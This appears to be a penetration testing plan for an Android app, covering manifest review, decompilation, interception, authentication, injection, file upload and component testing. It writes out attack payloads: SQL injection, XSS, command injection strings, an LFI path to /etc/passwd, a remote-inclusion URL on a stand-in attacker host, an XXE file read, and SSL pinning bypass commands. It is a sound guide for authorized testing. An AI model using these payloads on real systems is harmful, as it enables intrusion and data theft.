# Mobile App Security Testing Plan

## 📋 Static Testing (Analysis without running the app)

### 1. Manifest File Analysis
- Test for Activities exported=true
- Test for BACKUP is set to TRUE
- Test for Broadcast Receivers exported=true
- Test for Content Providers exported=true
- Test for DEBUG is set to TRUE
- Test for Services exported=true
- TaskAffinity is set for Activity
- High Intent Priority
- Launch Mode of Activity is not standard
- Clear text traffic is Enabled For App

**Tools**: JADX, Apktool, AndroidManifest.xml analysis

### 2. Reverse Engineering & Code Analysis
- Application build contains obsolete files
- Checking for Application Decompilation (apk/ipa)
- Testing for lack of obfuscation (reverse engineering)
- Checking for HARD coded credentials
- Checking for sensitive data in (.html,.txt,.js files)
- Application is accessible on Rooted Devices
- Private IP Disclosure

**Tools**: JADX, APKTool, dex2jar, JD-GUI, MobSF, Grep commands

### 3. Client Code Quality Checks
- Check for deep links schema
- Redundancy permission granted/Insecure application permissions
- Checking for insecure logging (log files)

**Tools**: Static code analyzers, MobSF, Logcat analysis

### 4. Cryptographic Implementation Review
- Checking for signing of the application
- Review encryption implementations in code

**Tools**: Keytool, jarsigner, Code review

---

## 🔄 Dynamic Testing (Runtime analysis with app running)

### 1. Network Traffic Analysis
- URL Redirection (if response header contains "location:" header)
- Bypass Certificate Pinning/SSL Pinning
- Missing SSL/TLS Encryption
- Checking for missing HTTP Response Security Headers
- Checking for server information in HTTP response header
- Cross Origin Resource Sharing (CORS)
- Host Header Injection
- Password reset poisoning through Host header injection

**Tools**: Burp Suite, OWASP ZAP, Frida, SSL Unpinning scripts

### 2. Authentication & Session Testing
- Bypassing Captcha
- Login bruteforce with Default usernames and default passwords
- Testing for account suspension/resumption process
- Username/Password Policy
- User Enumeration
- Checking for Session cookie/token Invalidation by reusing
- Concurrent logins
- Session Fixation
- Checking for Session Cookie/Sensitive token Exposure in URL
- Testing for Ratelimiting on Signup/Login/password reset functionality

**Tools**: Burp Suite Intruder, Custom scripts, Token analyzer

### 3. Authorization & Access Control Testing
- Bypassing authorization check by removing authorization token
- Testing for Insecure Direct Object Reference (IDOR)
- Testing for horizontal privilege escalation (user to user)
- Testing for vertical privilege escalation (user to admin)
- Checking for unprotected admin functionality
- Checking for parameter based broken access control
- Checking for broken access control from platform misconfiguration

**Tools**: Burp Suite Repeater, Multiple user accounts, Authz plugin

### 4. Injection Attacks
- Bypass of authentication using SQL Injection
- OS Command Injection
- Error based SQL Injection
- SQL Injection through Boolean-based blind mechanism
- SQL Injection through Time-based blind
- HTML Injection
- Cross Site Scripting verification for Reflected
- Cross Site Scripting verification for Stored

**Tools**: Burp Suite, SQLMap, Manual payloads, XSS Hunter

### 5. File Operations Testing
- Local File Inclusion
- Remote File Inclusion
- Upload malicious file by bypassing client side validation
- Upload malicious file by bypassing server side validation
- Malicious file upload check with File size
- Unrestricted file upload bypass through SVG file extension

**Tools**: Burp Suite Repeater, Custom payloads, File manipulation tools

### 6. Component Exploitation (Android-specific)
- Invoking Exported Content Providers
- Backing up Application Data
- Content providers: Path Traversal (client-side)
- Data Extraction using DEBUG
- Intent spoofing
- Intent spoofing validation bypass
- Invoking Exported Activities
- Invoking Exported Broadcast Receivers
- Invoking Exported Services

**Tools**: Drozer, ADB, Custom intents, Activity Manager

### 7. Data Storage Testing
- Testing for insecure data storage in databases
- Testing for insecure data storage in SD card
- Testing for insecure data storage in shared_preferences
- Testing for insecure data storage in Temporary file
- Clipboard is not disabled

**Tools**: ADB, Root explorer, SQLite browser, Runtime file monitoring

### 8. WebView Exploitation
- Checking for AllowContentAccess
- Checking for AllowFileAccess
- Exploiting Webview to perform open redirection
- Exploiting LFI if .setAllowUniversalAccessFromFileUrl is set to (true)
- Exploiting XSS if .setJavascriptEnabled is set to (true)

**Tools**: Burp Suite, Custom payloads, JavaScript injection

### 9. Business Logic Testing
- Price tampering with Price parameter manipulation
- Directory browsing
- Accessing Default Files (example: phpmyadmin)
- Admin panel disclosure

**Tools**: Burp Suite, Manual testing, Logic analysis

### 10. Vulnerability Scanning
- Identifying for the components with known vulnerabilities
- Outdated Framework/CRM/Wordpress
- Checking for hidden directories through directory brute-force

**Tools**: Nmap, Nikto, Wappalyzer, DirBuster, CVE databases

### 11. Advanced Attacks
- Blind SSRF
- Exploiting Billion Laughs Attack
- Checking for allowance of XML External Entities
- Insecure Error Handling
- Checking For stack Trace Error by submitting malicious inputs

**Tools**: Burp Suite Collaborator, XXE payloads, Error analysis

### 12. Code Modification Testing
- Unauthorized code modification
- Recompile android application with unauthorized code modification

**Tools**: APKTool, Signing tools, Runtime modification frameworks

---

## 🎯 Testing Execution Plan

### Phase 1: Static Analysis (Day 1-2)
**Step-by-step Process:**

1. **Obtain the APK**
   - Download from device: `adb pull /data/app/com.package.name/base.apk`
   - Or from provided source

2. **Decompile the Application**
   ```bash
   apktool d app.apk -o app_decompiled
   jadx app.apk -d app_jadx
   ```

3. **Analyze Manifest File**
   - Open `AndroidManifest.xml` from decompiled folder
   - Check all exported components (`android:exported="true"`)
   - Verify `android:debuggable="false"`
   - Check `android:allowBackup="false"`
   - Review permissions requested
   - Check `android:usesCleartextTraffic="false"`

4. **Code Review**
   - Search for hardcoded credentials:
     ```bash
     grep -r "password" app_jadx/
     grep -r "api_key" app_jadx/
     grep -r "secret" app_jadx/
     ```
   - Look for sensitive data in strings.xml
   - Check for insecure cryptographic implementations
   - Review network security configuration
   - Check for logging statements (Log.d, Log.v)

5. **Permission Analysis**
   - List all dangerous permissions
   - Verify necessity of each permission
   - Check for over-privileged requests

6. **Automated Static Analysis**
   ```bash
   # Using MobSF
   # Upload APK to MobSF web interface
   # Review automated findings
   ```

### Phase 2: Environment Setup (Day 2)

1. **Configure Genymotion**
   - Start Genymotion emulator
   - Install app: `adb install app.apk`
   - Verify root access if needed

2. **Configure Burp Suite Proxy**
   - Burp Proxy: 0.0.0.0:8080
   - Export Burp CA certificate
   - Install certificate on emulator:
     ```bash
     adb push burp-cert.cer /sdcard/
     # Settings > Security > Install from SD card
     ```
   - Set proxy in emulator: Settings > WiFi > Modify Network > Manual Proxy (Your IP:8080)

3. **SSL Pinning Bypass (if needed)**
   - Install Frida server on device
   - Use Objection or custom Frida script:
     ```bash
     objection -g com.package.name explore
     android sslpinning disable
     ```

4. **Install Additional Tools**
   - Drozer: For component testing
   - SQLite browser: For database analysis
   - File explorer with root access

### Phase 3: Dynamic Testing (Day 3-7)

#### Session 1: Authentication & Session Management (Day 3)

1. **Capture Traffic**
   - Open app with Burp intercept ON
   - Perform login flow
   - Save all requests/responses

2. **Test User Enumeration**
   - Try valid username with wrong password
   - Try invalid username
   - Compare responses (timing, error messages)

3. **Test Credential Policy**
   - Try weak passwords: `123456`, `password`
   - Test password length limits
   - Test special character handling

4. **Brute Force Testing**
   - Send login request to Burp Intruder
   - Load username/password wordlists
   - Check for account lockout after X attempts
   - Check rate limiting

5. **Session Token Analysis**
   - Copy session token/JWT
   - Analyze entropy and randomness
   - Check token expiration
   - Try reusing logged-out session tokens
   - Test concurrent sessions from different devices

6. **Captcha Bypass**
   - Inspect captcha implementation
   - Try removing captcha parameter
   - Try reusing old captcha tokens
   - Test rate limiting without captcha

#### Session 2: Authorization Testing (Day 4)

1. **Create Multiple User Accounts**
   - User1 (normal user)
   - User2 (normal user)
   - Admin1 (admin user)

2. **Test IDOR**
   - Login as User1, access User1's resource
   - Note the resource ID in URL/parameter
   - Try accessing User2's resource by changing ID
   - Document successful unauthorized access

3. **Test Horizontal Privilege Escalation**
   - User1 modifies their profile: capture request
   - Change user ID parameter to User2's ID
   - Check if User1 can modify User2's data

4. **Test Vertical Privilege Escalation**
   - Access admin functionality as normal user
   - Capture admin requests
   - Replay with normal user token
   - Try removing authorization headers
   - Try parameter manipulation (isAdmin=true)

5. **Test Hidden Admin Panels**
   - Browse to /admin, /administrator, /console
   - Use DirBuster for discovery
   - Check robots.txt for hints

#### Session 3: Injection Testing (Day 5)

1. **SQL Injection**
   - Identify input fields (login, search, filters)
   - Test with basic payloads:
     - `' OR '1'='1`
     - `admin'--`
     - `1' AND '1'='1`
   - Use SQLMap for automated testing:
     ```bash
     sqlmap -r request.txt --batch --dbs
     ```
   - Test time-based blind: `1' AND SLEEP(5)--`
   - Test boolean-based: `1' AND '1'='1` vs `1' AND '1'='2`

2. **XSS Testing**
   - Test reflected XSS in all input fields:
     - `<script>alert('XSS')</script>`
     - `<img src=x onerror=alert('XSS')>`
   - Test stored XSS (comments, profiles)
   - Check for CSP headers
   - Test DOM-based XSS in client-side code

3. **Command Injection**
   - Test file operations with: `; ls -la`
   - Test with: `| whoami`
   - Test with: `& dir`

4. **HTML Injection**
   - Inject HTML tags: `<h1>Test</h1>`
   - Try iframe injection

#### Session 4: File Operations (Day 5)

1. **File Upload Testing**
   - Upload legitimate file (image.jpg)
   - Capture request in Burp
   - Modify content-type to `image/jpeg` with PHP payload
   - Try double extensions: `shell.php.jpg`
   - Try SVG with XSS: `<svg onload=alert('XSS')>`
   - Upload large file (DoS test)
   - Try path traversal in filename: `../../shell.php`

2. **File Inclusion**
   - Test LFI: `?file=../../../etc/passwd`
   - Test RFI: `?file=http://attacker.com/shell.txt`
   - Try different encodings

#### Session 5: Component Exploitation (Day 6)

1. **Using Drozer**
   ```bash
   drozer console connect
   
   # List attack surface
   run app.package.attacksurface com.package.name
   
   # Test exported activities
   run app.activity.info -a com.package.name
   run app.activity.start --component com.package.name/.ActivityName
   
   # Test content providers
   run app.provider.info -a com.package.name
   run scanner.provider.finduris -a com.package.name
   
   # Test for SQL injection in content providers
   run scanner.provider.injection -a com.package.name
   
   # Test for path traversal
   run scanner.provider.traversal -a com.package.name
   ```

2. **Data Storage Testing**
   ```bash
   # Access app data directory
   adb shell
   su
   cd /data/data/com.package.name
   
   # Check shared preferences
   cat shared_prefs/*.xml
   
   # Check databases
   cd databases/
   sqlite3 database.db
   .tables
   SELECT * FROM users;
   
   # Check external storage
   cd /sdcard/Android/data/com.package.name/
   ```

3. **Test Backup Extraction**
   ```bash
   adb backup -f backup.ab com.package.name
   dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
   tar xvf backup.tar
   ```

#### Session 6: Business Logic & Misc (Day 7)

1. **Price Manipulation**
   - Add item to cart
   - Intercept checkout request
   - Modify price parameter
   - Complete transaction

2. **Race Conditions**
   - Send same request multiple times simultaneously
   - Use Burp's Turbo Intruder

3. **Error Handling**
   - Submit invalid inputs
   - Check for stack traces
   - Note information disclosure

4. **SSRF Testing**
   - Find URL input fields
   - Test with: `http://localhost:80`
   - Use Burp Collaborator

5. **XXE Testing**
   - Intercept XML requests
   - Inject XXE payload:
     ```xml
     <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
     <root>&xxe;</root>
     ```

---

## 📝 Common Testing Methods

### Method 1: Interception & Manipulation
- Intercept request in Burp Suite
- Send to Repeater
- Modify parameters/headers
- Analyze response

### Method 2: Parameter Fuzzing
- Identify parameter
- Send to Intruder
- Load wordlist/payloads
- Review results for anomalies

### Method 3: Token Analysis
- Extract token
- Decode (Base64, JWT)
- Analyze structure
- Test validity after logout/timeout

### Method 4: Multi-user Testing
- Create 2+ accounts
- Perform action with User1
- Try to access/modify with User2
- Check authorization boundaries

### Method 5: Code Review → Dynamic Validation
- Find potential vulnerability in code
- Craft specific test case
- Validate in runtime
- Document proof of concept

---

## 🛠️ Essential Tools Summary

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Primary proxy, intercepting, repeating, intruding |
| **Genymotion** | Android emulator |
| **ADB** | Android Debug Bridge for device interaction |
| **Drozer** | Android security assessment framework |
| **Frida/Objection** | Dynamic instrumentation, SSL pinning bypass |
| **APKTool** | APK decompilation |
| **JADX** | Dex to Java decompiler |
| **MobSF** | Automated static/dynamic analysis |
| **SQLMap** | Automated SQL injection |
| **DirBuster** | Directory brute-forcing |

---

## 📊 Reporting Template

For each vulnerability found:

1. **Title**: Clear vulnerability name
2. **Severity**: Critical/High/Medium/Low
3. **Steps to Reproduce**: Detailed step-by-step
4. **Proof of Concept**: Screenshots/request-response
5. **Impact**: What attacker can achieve
6. **Recommendation**: How to fix
7. **References**: OWASP category, CWE ID

---

## ⚡ Pro Tips

1. **Always test on isolated environment** - Never test on production without authorization
2. **Document everything** - Screenshots, requests, responses
3. **Start with low-hanging fruit** - Easy wins like manifest issues
4. **Chain vulnerabilities** - Combine multiple issues for higher impact
5. **Focus on business logic** - Automated tools miss these
6. **Read the code** - Understanding the app helps find unique vulnerabilities
7. **Test edge cases** - Negative numbers, very long strings, special characters
8. **Be patient with blind attacks** - SQL injection, SSRF need time
9. **Keep notes organized** - Use tools like CherryTree, Notion
10. **Stay updated** - Follow security researchers, read writeups

Good luck with your testing! 🎯